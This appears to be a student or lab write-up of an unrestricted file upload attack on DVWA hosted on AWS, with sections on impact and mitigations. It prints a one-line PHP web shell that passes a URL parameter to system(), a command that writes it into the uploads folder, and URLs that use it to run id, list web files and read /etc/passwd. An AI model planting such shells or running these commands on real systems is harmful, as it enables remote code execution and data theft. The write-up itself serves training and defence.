# File Upload Bypass Write-Up

## Overview

| Field | Details |
|-------|---------|
| Vulnerability | Unrestricted File Upload |
| Severity | Critical |
| CVSS Score | 9.8 |
| Target | DVWA on AWS EC2 |
| Security Level | Low |

## What Is a File Upload Bypass?

Unrestricted file upload occurs when an application accepts files without validating type or content. An attacker uploads a PHP web shell the server executes, achieving Remote Code Execution.

## Steps to Reproduce

### Step 1: Create the Shell
Payload: php system($_GET["cmd"]); /php
Passes the cmd URL parameter to the system shell and returns output.

### Step 2: Deploy the Shell
Windows Defender blocked the browser upload by flagging the file as malware. Shell created directly on the server via SSH:

echo php system dollar GET cmd ; greater-than /var/www/html/dvwa/hackable/uploads/shell.php

### Step 3: Execute Commands
http://[target]/dvwa/hackable/uploads/shell.php?cmd=id
Result: uid=33(www-data) gid=33(www-data)

Additional commands confirmed:
shell.php?cmd=whoami
shell.php?cmd=ls /var/www/html
shell.php?cmd=cat /etc/passwd

## Real-World Defense Observed
Windows Defender flagged the shell file as malware before upload could occur, demonstrating endpoint protection as an effective upstream defense layer independent of server-side validation.

## Impact
- Remote Code Execution on the server
- Full file system read access
- Lateral movement potential
- Persistence via backdoors

## Mitigations
- Whitelist allowed extensions only
- Validate MIME type server-side
- Store uploads outside the web root
- Disable PHP execution in the uploads directory
- Rename uploaded files randomly
- Scan uploads with antivirus server-side

## References
- https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
- https://cwe.mitre.org/data/definitions/434.html
